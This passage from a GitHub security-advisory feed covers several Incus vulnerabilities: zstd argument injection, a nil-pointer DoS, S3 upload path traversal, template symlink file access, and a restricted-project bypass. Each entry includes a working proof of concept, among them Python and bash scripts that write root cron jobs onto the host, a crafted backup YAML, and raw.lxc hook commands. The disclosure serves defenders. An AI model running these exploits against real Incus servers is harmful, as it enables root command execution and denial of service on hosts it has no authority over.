+<pre><code class="language-go">fields, err := shellquote.Split(value)
+...
+if !slices.Contains([]string{"bzip2", "gzip", "lz4", "lzma", "pigz", "pzstd", "pxz", "tar2sqfs", "xz", "zstd"}, fields[0]) {
+    return fmt.Errorf("Compression algorithm %q isn't currently supported", fields[0])
+}
+_, err = exec.LookPath(fields[0])
+</code></pre>
+<p>Extra arguments are not rejected. <code>compressFile()</code> then prepends <code>-c</code> and passes the remaining user-supplied fields to the compressor:</p>
+<pre><code class="language-go">args := []string{"-c"}
+if len(fields) &gt; 1 {
+    args = append(args, fields[1:]...)
+}
+cmd := exec.Command(fields[0], args...)
+cmd.Stdin = infile
+cmd.Stdout = outfile
+</code></pre>
+<p>With a value like:</p>
+<pre><code class="language-text">zstd -d -f --pass-through -o /etc/cron.d/incus-zstd-rce -- /var/lib/incus/.../payload
+</code></pre>
+<p>the daemon executes the equivalent of:</p>
+<pre><code class="language-text">zstd -c -d -f --pass-through -o /etc/cron.d/incus-zstd-rce -- /var/lib/incus/.../payload
+</code></pre>
+<h3 id="poc">PoC</h3>
+<pre><code>python3 poc.py \
+    --insecure --url https://remote-incus:8443 \
+    --cert ~/.config/incus/client.crt --key ~/.config/incus/client.key \
+    --instance c01 \
+    --execute --yes-i-understand-this-writes-host-file
+</code></pre>
+<p>The following was generated by an LLM model.</p>
+<pre><code>#!/usr/bin/env python3
+"""Short remote Incus backup compression zstd cron RCE PoC.
+
+Dry-run is the default.  --execute uploads a cron payload into an instance and then asks Incus for a direct backup with a zstd argument-injection compressor:
+
+    zstd -c -d -f --pass-through -o /etc/cron.d/incus-zstd-rce -- &lt;source&gt;
+
+The direct backup may fail after zstd runs; the host file write is the primitive. Use only on an authorized Incus server.
+"""
+
+from __future__ import annotations
+
+import argparse
+import json
+import os
+import shlex
+import sys
+import urllib.parse
+from pathlib import PurePosixPath
+from typing import Any
+
+import requests
+
+
+def q(value: str) -&gt; str:
+    return urllib.parse.quote(value, safe="")
+
+
+def api(base: str, endpoint: str, **params: str) -&gt; str:
+    return base.rstrip("/") + endpoint + ("?" + urllib.parse.urlencode(params) if params else "")
+
+
+def project_instance(project: str, instance: str) -&gt; str:
+    return instance if project == "default" else f"{project}_{instance}"
+
+
+def clean_guest_path(path: str) -&gt; str:
+    if not path.startswith("/"):
+        raise ValueError("--guest-path must be absolute")
+    if ".." in PurePosixPath(path).parts:
+        raise ValueError("--guest-path must not contain '..'")
+    return os.path.normpath("/" + path.lstrip("/")).lstrip("/")
+
+
+def source_path(args: argparse.Namespace) -&gt; str:
+    if args.source_host_path:
+        return args.source_host_path
+    return os.path.join(
+        args.incus_dir,
+        "storage-pools",
+        args.pool,
+        args.storage_kind,
+        project_instance(args.project, args.instance),
+        "rootfs",
+        clean_guest_path(args.guest_path),
+    )
+
+
+def cron(command: str) -&gt; bytes:
+    return f"* * * * * root /bin/sh -c {shlex.quote(command)}\n".encode()
+
+
+def session(args: argparse.Namespace) -&gt; requests.Session:
+    s = requests.Session()
+    s.verify = False if args.insecure else (args.cacert or True)
+    if args.cert or args.key:
+        s.cert = (args.cert, args.key)
+    if args.token:
+        s.headers["Authorization"] = "Bearer " + args.token
+    s.headers["User-Agent"] = "incus-zstd-backup-rce-poc"
+    if args.insecure:
+        requests.packages.urllib3.disable_warnings()  # type: ignore[attr-defined]
+    return s
+
+
+def check(resp: requests.Response, what: str) -&gt; requests.Response:
+    if resp.status_code &gt;= 400:
+        try:
+            detail: Any = resp.json()
+        except Exception:
+            detail = resp.text[:2048]
+        raise RuntimeError(f"{what} failed: HTTP {resp.status_code}: {detail}")
+    return resp
+
+
+def upload(s: requests.Session, args: argparse.Namespace, payload: bytes) -&gt; None:
+    url = api(args.url, f"/1.0/instances/{q(args.instance)}/files", project=args.project, path=args.guest_path)
+    headers = {
+        "Content-Type": "application/octet-stream",
+        "X-Incus-type": "file",
+        "X-Incus-write": "overwrite",
+        "X-Incus-uid": "0",
+        "X-Incus-gid": "0",
+        "X-Incus-mode": "0644",
+    }
+    print(f"[*] uploading cron payload to {args.instance}:{args.guest_path}")
+    check(s.post(url, data=payload, headers=headers, timeout=args.timeout), "payload upload")
+
+
+def trigger_backup(s: requests.Session, args: argparse.Namespace, body: dict[str, Any]) -&gt; None:
+    url = api(args.url, f"/1.0/instances/{q(args.instance)}/backups", project=args.project)
+    print("[*] sending direct backup request")
+    resp = s.post(
+        url,
+        data=json.dumps(body).encode(),
+        headers={"Accept": "application/octet-stream", "Content-Type": "application/json"},
+        timeout=args.timeout,
+        stream=True,
+    )
+    print(f"[*] backup HTTP {resp.status_code}")
+    resp.close()
+    if resp.status_code &gt;= 400:
+        print("[*] HTTP error after compressor launch is possible; check whether the cron file was written")
+
+
+def parse_args() -&gt; argparse.Namespace:
+    p = argparse.ArgumentParser(description="Remote Incus zstd backup-compression cron RCE PoC")
+    p.add_argument("--url", required=True, help="https://host:8443")
+    p.add_argument("--cert", help="client certificate PEM")
+    p.add_argument("--key", help="client private key PEM")
+    p.add_argument("--cacert", help="CA certificate PEM")
+    p.add_argument("--token", help="bearer token")
+    p.add_argument("--insecure", action="store_true", help="disable TLS verification")
+    p.add_argument("--timeout", type=int, default=180)
+
+    p.add_argument("--project", default="default")
+    p.add_argument("--instance", required=True)
+    p.add_argument("--pool", default="default")
+    p.add_argument("--storage-kind", choices=["containers", "virtual-machines"], default="containers")
+    p.add_argument("--incus-dir", default="/var/lib/incus")
+    p.add_argument("--guest-path", default="/incus-zstd-cron")
+    p.add_argument("--source-host-path", help="override daemon-readable host path for the staged payload")
+    p.add_argument("--cron-path", default="/etc/cron.d/incus-zstd-rce")
+    p.add_argument("--command", default="date &gt;/incus-zstd-rce; id &gt;&gt;/incus-zstd-rce")
+
+    p.add_argument("--execute", action="store_true", help="stage payload and send backup request")
+    p.add_argument("--yes-i-understand-this-writes-host-file", action="store_true", help="required with --execute")
+    args = p.parse_args()
+
+    if urllib.parse.urlparse(args.url).scheme != "https":
+        p.error("--url must use https")
+    if bool(args.cert) != bool(args.key):
+        p.error("--cert and --key must be supplied together")
+    if args.execute and not args.yes_i_understand_this_writes_host_file:
+        p.error("--execute requires --yes-i-understand-this-writes-host-file")
+    try:
+        clean_guest_path(args.guest_path)
+    except ValueError as exc:
+        p.error(str(exc))
+
+    args.url = args.url.rstrip("/")
+    return args
+
+
+def main() -&gt; int:
+    args = parse_args()
+    src = source_path(args)
+    payload = cron(args.command)
+    compressor = f"zstd -d -f --pass-through -o {shlex.quote(args.cron_path)} -- {shlex.quote(src)}"
+    body = {"compression_algorithm": compressor, "instance_only": True}
+
+    print("[*] target:", args.url)
+    print("[*] project:", args.project)
+    print("[*] instance:", args.instance)
+    print("[*] source host path:", src)
+    print("[*] cron path:", args.cron_path)
+    print("[*] payload:", payload.decode().rstrip())
+    print("[*] backup body:", json.dumps(body, sort_keys=True))
+
+    if not args.execute:
+        print("[*] dry run only; add --execute and the confirmation flag to act")
+        return 0
+
+    s = session(args)
+    upload(s, args, payload)
+    trigger_backup(s, args, body)
+    return 0
+
+
+if __name__ == "__main__":
+    try:
+        raise SystemExit(main())
+    except BrokenPipeError:
+        raise SystemExit(1)
+    except Exception as exc:
+        print(f"[-] {exc}", file=sys.stderr)
+        raise SystemExit(1)
+</code></pre>
+<h3 id="impact">Impact</h3>
+<p>Improperly validated compression algorithm argument leads to argument injection leading to arbitrary file write with <code>zstd</code> and possibly arbitrary command execution.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/lxc/incus/security/advisories/GHSA-v6mj-8pf4-hhw4">https://github.com/lxc/incus/security/advisories/GHSA-v6mj-8pf4-hhw4</a></li>
+<li><a href="https://github.com/advisories/GHSA-v6mj-8pf4-hhw4">https://github.com/advisories/GHSA-v6mj-8pf4-hhw4</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-v6mj-8pf4-hhw4</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2026-06-26T19:03:31.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/lxc/incus/v7/cmd/incusd] Incus: Nil-pointer dereference in createDependentVolumesFromBackup on disk.{Volume,VolumeSnapshots,Pool}]]></title>
+        <id>https://github.com/advisories/GHSA-4xg6-52mh-fpw8</id>
+        <link href="https://github.com/advisories/GHSA-4xg6-52mh-fpw8"/>
+        <updated>2026-06-26T18:52:47.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p><code>(*backend).createDependentVolumesFromBackup</code> in <a href="https://github.com/lxc/incus/blob/d768f81c0a1d985f35ae56219519822b080bf5e3/internal/server/storage/backend.go"><code>internal/server/storage/backend.go</code></a> contains a cluster of unguarded pointer derefs on every dependent-volume entry's <code>VolumeSnapshots[i]</code>, <code>Volume</code>, and <code>Pool</code> sub-fields. An authenticated user with <code>can_create_instances</code> permission on any project can crash the <code>incusd</code> daemon by uploading an instance backup tarball whose <code>dependent_volumes[*]</code> block contains a nil snapshot pointer (or omits <code>volume:</code> / <code>pool:</code>).</p>
+<p>This is a sibling-field variant of the 2026-05-04 batch fix <code>d768f81c0a1d985f35ae56219519822b080bf5e3</code> ("Properly check dependent volumes on import"). That commit added <code>if disk == nil</code> at the top of the outer loop, but did not guard the four sub-pointer fields the loop body dereferences naked.</p>
+<h2 id="vulnerable-code">Vulnerable code</h2>
+<p><a href="https://github.com/lxc/incus/blob/d768f81c0a1d985f35ae56219519822b080bf5e3/internal/server/storage/backend.go#L9352-L9412"><code>internal/server/storage/backend.go:9352-9412</code></a>:</p>
+<pre><code class="language-go">func (b *backend) createDependentVolumesFromBackup(srcBackup backup.Info, ...) error {
+    ...
+    for _, disk := range srcBackup.Config.DependentVolumes {
+        if disk == nil {                                  // ← d768f81 parent fix
+            return errors.New("Bad dependent volume definition found in index")
+        }
+        ...
+        snapshots := []string{}
+        for _, snap := range disk.VolumeSnapshots {
+            snapshots = append(snapshots, snap.Name)      // ← I-2 trigger: snap may be nil
+        }
+
+        bInfo := backup.Info{
+            Project:          disk.Volume.Project,        // ← disk.Volume may be nil
+            Name:             disk.Volume.Name,
+            Backend:          disk.Pool.Driver,           // ← disk.Pool may be nil
+            Pool:             disk.Pool.Name,
+            ...
+        }
+        ...
+        devKey := fmt.Sprintf("%s/%s", disk.Pool.Name, disk.Volume.Name)
+        ...
+    }
+}
+</code></pre>
+<p><code>disk</code> has type <code>*config.Config</code> (declared in <a href="https://github.com/lxc/incus/blob/d768f81c0a1d985f35ae56219519822b080bf5e3/internal/server/backup/config/backup_config.go#L8"><code>internal/server/backup/config/backup_config.go:8</code></a>). Its <code>Volume</code> field is <code>*api.StorageVolume</code>, <code>Pool</code> is <code>*api.StoragePool</code>, <code>VolumeSnapshots</code> is <code>[]*api.StorageVolumeSnapshot</code> — all yaml <code>omitempty</code>. YAML omission decodes to nil for each.</p>
+<p>The parent fix mental-modeled "outer-iteration variable nil"; it did not walk every sub-field deref inside the loop body. Direct asymmetric-guard variant.</p>
+<h2 id="reach">Reach</h2>
+<ol>
+<li>Attacker is an authenticated client with <code>can_create_instances</code> on any project. Same auth gate as GHSA-8g7m-96c8-8wwc / CVE-2026-47753.</li>
+<li><code>POST /1.0/instances</code> with <code>Content-Type: application/octet-stream</code> and <code>X-Incus-name: &lt;name&gt;</code>.</li>
+<li>Body is a tar containing <a href="https://github.com/lxc/incus/blob/d768f81c0a1d985f35ae56219519822b080bf5e3/backup/index.yaml"><code>backup/index.yaml</code></a> whose <code>config:</code> block has a non-nil <code>container:</code> (passes <code>instances_post.go:854 if bInfo.Config == nil || bInfo.Config.Container == nil</code>) and a <code>dependent_volumes:</code> list with a malformed entry.</li>
+<li>Chain: <code>instancesPost</code> -&gt; <code>createFromBackup:854</code> (Container guard passes) -&gt; <code>pool.CreateInstanceFromBackup</code> -&gt; <code>backend.go:782 b.createDependentVolumesFromBackup</code> -&gt; <code>backend.go:9374 snap.Name</code> panics on the nil <code>*api.StorageVolumeSnapshot</code> element.</li>
+<li><code>incusd</code> dies. Persistent DoS on repeat.</li>
+</ol>
+<p>Minimal <a href="https://github.com/lxc/incus/blob/d768f81c0a1d985f35ae56219519822b080bf5e3/backup/index.yaml"><code>backup/index.yaml</code></a> (used in the bundled PoC):</p>
+<pre><code class="language-yaml">name: poc-inst
+backend: dir
+pool: default
+type: container
+optimized: false
+optimized_header: false
+snapshots: []
+config:
+  container:
+    name: poc-inst
+    architecture: x86_64
+    type: container
+    profiles: ["default"]
+    config: {}
+    devices: {}
+    expanded_devices:
+      depdisk: {type: disk, dependent: "true", pool: default, source: depvol, path: /data}
+    expanded_config: {}
+  dependent_volumes:
+    - volume: {name: depvol, type: custom, content_type: filesystem, config: {}}
+      pool:   {name: default, driver: dir, config: {}}
+      volume_snapshots:
+        - ~    # explicit null entry → snap.Name at 9374 panics
+</code></pre>
+<p>(The container block must declare at least one device with <code>type: disk</code>, <code>dependent: "true"</code>, <code>pool != ""</code>, <code>path != "/"</code> to populate <code>devicesMap</code> and reach the second loop. Trivially satisfiable.)</p>
+<p>An equivalent triggering YAML omits <code>volume:</code> or <code>pool:</code> from the dependent_volumes entry; in that case <code>disk.Volume.Project</code> at 9378 panics instead.</p>
+<h2 id="proof-of-concept-end-to-end-against-running-daemon">Proof of concept (end-to-end against running daemon)</h2>
+<p>Bundled in the report: <code>make_backup.sh</code> + 666-byte <code>poc-inst.tar.gz</code>.</p>
+<p>Tested against <code>incus 7.0.0</code> (zabbly latest GA, build <code>1:0~ubuntu24.04~202605201355</code>) inside a privileged Ubuntu 24.04 container with default <code>dir</code> pool.</p>
+<pre><code class="language-bash">$ curl -s --unix-socket /var/lib/incus/unix.socket -X POST \
+    --data-binary @/tmp/poc-inst.tar.gz \
+    -H 'Content-Type: application/octet-stream' \
+    -H 'X-Incus-name: poc-inst' \
+    http://incus/1.0/instances
+{"type":"async","status":"Operation created","status_code":100,...}
+
+$ ps -ef | grep incusd | grep -v grep    # process gone
+</code></pre>
+<p>Daemon panic:</p>
+<pre><code>panic: runtime error: invalid memory address or nil pointer dereference
+[signal SIGSEGV: segmentation violation code=0x1 addr=0x18 pc=0x163b7bc]
+
+goroutine 257 [running]:
+github.com/lxc/incus/v7/internal/server/storage.(*backend).createDependentVolumesFromBackup(...)
+    /build/incus/internal/server/storage/backend.go:9374 +0x42c
+github.com/lxc/incus/v7/internal/server/storage.(*backend).CreateInstanceFromBackup(...)
+    /build/incus/internal/server/storage/backend.go:782 +0x660
+main.createFromBackup.func8(...)
+    /build/incus/cmd/incusd/instances_post.go:989 +0x2ac
+github.com/lxc/incus/v7/internal/server/operations.(*Operation).Start.func1(...)
+    /build/incus/internal/server/operations/operations.go:307 +0x2c
+</code></pre>
+<p>Stack frame <a href="https://github.com/lxc/incus/blob/d768f81c0a1d985f35ae56219519822b080bf5e3/backend.go#L9374"><code>backend.go:9374</code></a> is the literal <code>snap.Name</code> line.</p>
+<h2 id="impact">Impact</h2>
+<ul>
+<li><strong>Severity:</strong> denial of service against the entire <code>incusd</code> process. Every container / VM / storage operation on the host (and on the cluster member, if clustered) is aborted; subsequent requests fail until an operator restarts the process.</li>
+<li><strong>Privileges required:</strong> any authenticated user with <code>can_create_instances</code> on any project. Not behind the admin tier.</li>
+<li><strong>Network attack surface:</strong> the Incus REST API on <code>:8443</code> or the unix socket.</li>
+<li><strong>CWE-476</strong> — Nil-Pointer Dereference. <strong>CVSS estimate:</strong> 6.5 (AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H).</li>
+<li><strong>Versions:</strong> v7.0.0 confirmed. The <code>dependent_volumes</code> feature did not exist in v6.x, so the vulnerable code is v7-only.</li>
+</ul>
+<h2 id="suggested-fix">Suggested fix</h2>
+<pre><code class="language-diff">--- a/internal/server/storage/backend.go
++++ b/internal/server/storage/backend.go
+@@ -9362,6 +9362,18 @@ func (b *backend) createDependentVolumesFromBackup(...) error {
+     for _, disk := range srcBackup.Config.DependentVolumes {
+         if disk == nil {
+             return errors.New("Bad dependent volume definition found in index")
+         }
++
++        if disk.Volume == nil || disk.Pool == nil {
++            return errors.New("Bad dependent volume definition: missing volume or pool")
++        }
++
++        for _, snap := range disk.VolumeSnapshots {
++            if snap == nil {
++                return errors.New("Bad dependent volume snapshot definition")
++            }
++        }
++
+         optimizedStorage := srcBackup.OptimizedStorage
+         optimizedHeader := srcBackup.OptimizedHeader
+
+         snapshots := []string{}
+         for _, snap := range disk.VolumeSnapshots {
+             snapshots = append(snapshots, snap.Name)
+         }
+</code></pre>
+<h2 id="reporter-notes">Reporter notes</h2>
+<p>Reported via Privately-Reported Vulnerability against <code>lxc/incus</code> by tonghuaroot.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/lxc/incus/security/advisories/GHSA-4xg6-52mh-fpw8">https://github.com/lxc/incus/security/advisories/GHSA-4xg6-52mh-fpw8</a></li>
+<li><a href="https://github.com/advisories/GHSA-4xg6-52mh-fpw8">https://github.com/advisories/GHSA-4xg6-52mh-fpw8</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-4xg6-52mh-fpw8</uri>
+        </author>
+        <category label="severity" term="LOW"/>
+        <published>2026-06-26T18:52:46.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/lxc/incus/v7/cmd/incusd] Incus has an arbitrary file write via path traversal in S3 multipart upload]]></title>
+        <id>https://github.com/advisories/GHSA-ccjc-4qc3-jxqc</id>
+        <link href="https://github.com/advisories/GHSA-ccjc-4qc3-jxqc"/>
+        <updated>2026-06-26T18:47:27.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>The S3 protocol upload endpoint is vulnerable to path traversal and allows creation of arbitrary files on the host. This behavior could lead to arbitrary command execution.</p>
+<p>In <code>internal/server/storage/s3/local/multipart.go</code>, user-controlled upload ID is appended to the uploads directory unsanitized; <a href="https://github.com/lxc/incus/blob/40dd4f151d52c06b178482aa2518abfb9df3e6fb/internal/server/storage/s3/local/multipart.go#L33">https://github.com/lxc/incus/blob/40dd4f151d52c06b178482aa2518abfb9df3e6fb/internal/server/storage/s3/local/multipart.go#L33</a></p>
+<h2 id="poc">PoC</h2>
+<h3 id="setup">Setup</h3>
+<pre><code># Expose the S3 API and create a bucket
+incus config set core.storage_buckets_address=:8555
+incus storage volume create default bucket
+#&gt; note the credentials
+</code></pre>
+<h3 id="exploitation">Exploitation</h3>
+<p>The below script was mostly generated.</p>
+<pre><code>#!/usr/bin/env bash
+set -euo pipefail
+
+if [ $# -lt 4 ]; then
+    printf 'usage: $0 endpoint bucket access-key secret-key\n' &gt;&amp;2
+    exit 1
+fi
+
+endpoint="${1%/}"
+bucket="${2}"
+access="${3}"
+secret="${4}"
+
+region="us-east-1"
+service="s3"
+key="anything"
+part="1"
+upload_id="../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/cron.d"
+target="/etc/cron.d/part-00001"
+cmd="id &gt; /incus-s3-uploadid-bash-rce; rm -f $target"
+body="* * * * * root /bin/sh -c '$cmd'
+"
+
+uri_path="$(printf '%s' "$endpoint" | sed -E 's#^[a-z]+://[^/]+##')/$bucket/$key"
+uri_path="${uri_path#/}"
+uri_path="/$uri_path"
+host="$(printf '%s' "$endpoint" | sed -E 's#^[a-z]+://([^/]+).*#\1#')"
+qs="partNumber=$part&amp;uploadId=${upload_id//\//%2F}"
+url="$endpoint/$bucket/$key?$qs"
+
+amz_date=$(date -u +%Y%m%dT%H%M%SZ)
+date_scope="${amz_date:0:8}"
+scope="$date_scope/$region/$service/aws4_request"
+body_hash=$(printf '%s' "$body" | sha256sum | awk '{print $1}')
+signed="host;x-amz-content-sha256;x-amz-date"
+
+canonical="PUT
+$uri_path
+$qs
+host:$host
+x-amz-content-sha256:$body_hash
+x-amz-date:$amz_date
+
+$signed
+$body_hash"
+canonical_hash="$(printf '%s' "$canonical" | sha256sum | awk '{print $1}')"
+string_to_sign="AWS4-HMAC-SHA256
+$amz_date
+$scope
+$canonical_hash"
+
+hmac_hex() {
+    printf '%s' "${2}" | openssl dgst -sha256 -mac HMAC -macopt "hexkey:${1}" -binary | xxd -p -c 256
+}
+
+k_date=$(printf 'AWS4%s' "$secret" | xxd -p -c 256)
+k_date=$(hmac_hex "$k_date" "$date_scope")
+k_region=$(hmac_hex "$k_date" "$region")
+k_service=$(hmac_hex "$k_region" "$service")
+k_signing=$(hmac_hex "$k_service" "aws4_request")
+sig=$(hmac_hex "$k_signing" "$string_to_sign")
+auth="AWS4-HMAC-SHA256 Credential=${access}/${scope},SignedHeaders=${signed},Signature=${sig}"
+
+printf '# body:\n%s' "${body}"
+
+curl -ksS -X PUT "${url}" \
+    -H "Host: ${host}" \
+    -H "X-Amz-Date: ${amz_date}" \
+    -H "X-Amz-Content-Sha256: ${body_hash}" \
+    -H "Authorization: ${auth}" \
+    --data-binary "${body}"
+</code></pre>
+<h2 id="impact">Impact</h2>
+<p>Arbitrary file write on the host. Possibly leading to arbitrary command execution.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/lxc/incus/security/advisories/GHSA-ccjc-4qc3-jxqc">https://github.com/lxc/incus/security/advisories/GHSA-ccjc-4qc3-jxqc</a></li>
+<li><a href="https://github.com/advisories/GHSA-ccjc-4qc3-jxqc">https://github.com/advisories/GHSA-ccjc-4qc3-jxqc</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-ccjc-4qc3-jxqc</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2026-06-26T18:47:25.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/lxc/incus/v7/cmd/incusd] Incus has arbitrary file read+write on host via templates/ symlink in malicious image]]></title>
+        <id>https://github.com/advisories/GHSA-vxp5-584q-c479</id>
+        <link href="https://github.com/advisories/GHSA-vxp5-584q-c479"/>
+        <updated>2026-06-26T18:46:32.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>A specially crafted image or instance backup can be used to read or create/write arbitrary files on the host; possibly leading to arbitrary command execution.</p>
+<h3 id="details">Details</h3>
+<p>For container images, <code>internal/server/storage/utils.go</code> calls <code>archive.Unpack(imageFile, destPath, ...)</code>. The tar extraction path in <code>shared/archive/archive.go</code> excludes device nodes, but it does not reject a top-level <code>templates</code> symlink.</p>
+<p>For instance backups, <code>internal/server/storage/drivers/driver_dir_volumes.go:rsync.LocalCopy</code> uses argument <code>-a</code> (archive mode), but does not add <code>--safe-links</code>. This allows a top-level <code>templates</code> symlink.</p>
+<p>In practice, this allows a malicious actor to access an arbitrary directory and edit arbitrary files in it.</p>
+<h3 id="poc">PoC</h3>
+<h4 id="malicious-container-image">Malicious container image</h4>
+<p>Below, the templates directory is  mapped to <code>/etc/cron.d</code> on the host, but it can be mapped anywhere. After that, create a cronjob to run <code>id</code> as root.</p>
+<pre><code>#!/bin/sh
+set -eu
+
+tmpdir=$(mktemp -d)
+cleanup() {
+    rm -rf "${tmpdir}"
+}
+trap cleanup EXIT INT QUIT TERM HUP
+
+mkdir -p "${tmpdir}/img/rootfs"
+ln -s /etc/cron.d "${tmpdir}/img/templates"
+cat&lt;&lt;__EOF__&gt;"${tmpdir}/img/metadata.yaml"
+architecture: x86_64
+creation_date: 1
+properties:
+  description: PoC templates symlink host afrw
+__EOF__
+
+cd "${tmpdir}/img"
+tar --owner=0 --group=0 -f- -c * &gt;../afrw-image-templates-symlink.tar
+incus image import ../afrw-image-templates-symlink.tar --alias afrw-image-templates-symlink
+incus init afrw-image-templates-symlink afrw-image-templates-symlink
+
+incus config template ls afrw-image-templates-symlink
+
+# read
+#incus config template show afrw-image-templates-symlink $FILENAME
+
+# write
+printf "* * * * * root sh -c 'id&gt;/pwned'\n" | incus config template create afrw-image-templates-symlink poc-32
+#incus config template edit afrw-image-templates-symlink poc
+</code></pre>
+<h4 id="malicious-instance-backup">Malicious instance backup</h4>
+<p>Below, the templates directory is mapped to <code>/etc/cron.d</code> on the host, but it can be mapped anywhere. After that, create a cronjob to run <code>id</code> as root.</p>
+<pre><code>#!/bin/sh
+set -eu
+
+tmpdir=$(mktemp -d)
+cleanup() {
+    rm -rf "${tmpdir}"
+}
+trap cleanup EXIT INT QUIT TERM HUP
+
+mkdir -p "${tmpdir}/img/backup"
+cat&lt;&lt;__EOF__&gt;"${tmpdir}/img/backup/index.yaml"
+name: afrw-backup-templates-symlink
+backend: dir
+pool: default
+type: container
+optimized: false
+__EOF__
+
+mkdir "${tmpdir}/img/backup/container"
+cat&lt;&lt;__EOF__&gt;"${tmpdir}/img/backup/container/backup.yaml"
+container:
+  name: afrw-backup-templates-symlink
+  architecture: x86_64
+  type: container
+  status: Stopped
+  status_code: 102
+  stateful: false
+  ephemeral: false
+  profiles:
+    - default
+  config:
+    volatile.uuid: 58a0f7de-2490-4e85-9fb2-153ef0fc7be5
+    volatile.uuid.generation: 24d829e5-d74a-4285-88c0-be369140fb49
+  expanded_config:
+    volatile.uuid: 58a0f7de-2490-4e85-9fb2-153ef0fc7be5
+    volatile.uuid.generation: 24d829e5-d74a-4285-88c0-be369140fb49
+  devices: {}
+  expanded_devices:
+    root:
+      path: /
+      pool: default
+      type: disk
+  created_at: "2024-01-01T00:00:00Z"
+  last_used_at: "2024-01-01T00:00:00Z"
+volume:
+  name: afrw-backup-templates-symlink
+  type: container
+  content_type: filesystem
+  config: {}
+pool:
+  name: default
+  driver: dir
+  config: {}
+__EOF__
+
+cat&lt;&lt;__EOF__&gt;"${tmpdir}/img/backup/container/metadata.yaml"
+architecture: x86_64
+creation_date: 1
+properties:
+  description: afrw-backup-templates-symlink
+__EOF__
+
+mkdir "${tmpdir}/img/backup/container/rootfs"
+ln -s /etc/cron.d "${tmpdir}/img/backup/container/templates"
+
+cd "${tmpdir}/img"
+tar --owner=0 --group=0 -f- -c backup &gt;../afrw-backup-templates-symlink.tar
+incus import ../afrw-backup-templates-symlink.tar afrw-backup-templates-symlink
+
+incus config template ls afrw-backup-templates-symlink
+
+# read
+#incus config template show afrw-backup-templates-symlink $FILENAME
+
+# write
+printf "* * * * * root sh -c 'id&gt;/pwned'\n" | incus config template create afrw-backup-templates-symlink poc-32
+#incus config template edit afrw-templates-symlink poc
+</code></pre>
+<h3 id="impact">Impact</h3>
+<p>Arbitrary file read and write on the host via unsanitized symlink; possibly leading to command execution.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/lxc/incus/security/advisories/GHSA-vxp5-584q-c479">https://github.com/lxc/incus/security/advisories/GHSA-vxp5-584q-c479</a></li>
+<li><a href="https://github.com/advisories/GHSA-vxp5-584q-c479">https://github.com/advisories/GHSA-vxp5-584q-c479</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-vxp5-584q-c479</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2026-06-26T18:46:31.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/lxc/incus/v7/cmd/incusd] Incus has a restricted project bypass leading to arbitrary command execution]]></title>
+        <id>https://github.com/advisories/GHSA-48q5-w887-33wv</id>
+        <link href="https://github.com/advisories/GHSA-48q5-w887-33wv"/>
+        <updated>2026-06-26T18:33:56.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>Instance snapshots ignore the <code>restricted.containers.lowlevel=block</code> setting; allowing for arbitrary command execution on the Incus server by abusing lowlevel hooks such as <code>raw.lxc</code> and <code>raw.qemu</code>.</p>
+<h3 id="details">Details</h3>
+<p>Instance snapshots ignore the <code>restricted.containers.lowlevel=block</code> setting; allowing for arbitrary command execution on the Incus server by abusing lowlevel hooks such as <code>raw.lxc</code> and <code>raw.qemu</code>.</p>
+<p>As snapshots can be moved from one server to another, a malicious instance+snapshot can be crafted locally, moved to a restricted project and the snapshot restored for arbitrary command execution.</p>
+<p>In practice, this allows a malicious actor to execute arbitrary commands on the host with root privileges.</p>
+<h3 id="poc">PoC</h3>
+<pre><code># remote, restricted
+incus project set rem:project restricted.true
+incus project set rem:project restricted.containers.lowlevel=block
+
+# locally, unrestricted project
+incus init images:debian/trixie rce-raw-lxc
+incus config set rce-raw-lxc raw.lxc='lxc.hook.pre-start = /bin/sh -c "/bin/id &gt;/lxc-hook-prestart"'
+incus snapshot create rce-raw-lxc snap0
+#&gt; allow transfer to restricted project
+incus config unset rce-raw-lxc raw.lxc
+
+# locally, transfer and trigger
+incus move rce-raw-lxc rem: --mode push
+incus snapshot restore rem:rce-raw-lxc snap0
+incus start rem:rce-raw-lxc
+</code></pre>
+<h3 id="impact">Impact</h3>
+<ul>
+<li>Bypass of project restrictions.</li>
+<li>Arbitrary command execution on the Incus server.</li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/lxc/incus/security/advisories/GHSA-48q5-w887-33wv">https://github.com/lxc/incus/security/advisories/GHSA-48q5-w887-33wv</a></li>
+<li><a href="https://github.com/advisories/GHSA-48q5-w887-33wv">https://github.com/advisories/GHSA-48q5-w887-33wv</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-48q5-w887-33wv</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2026-06-26T18:33:55.000Z</published>
+    </entry>
+    <entry>
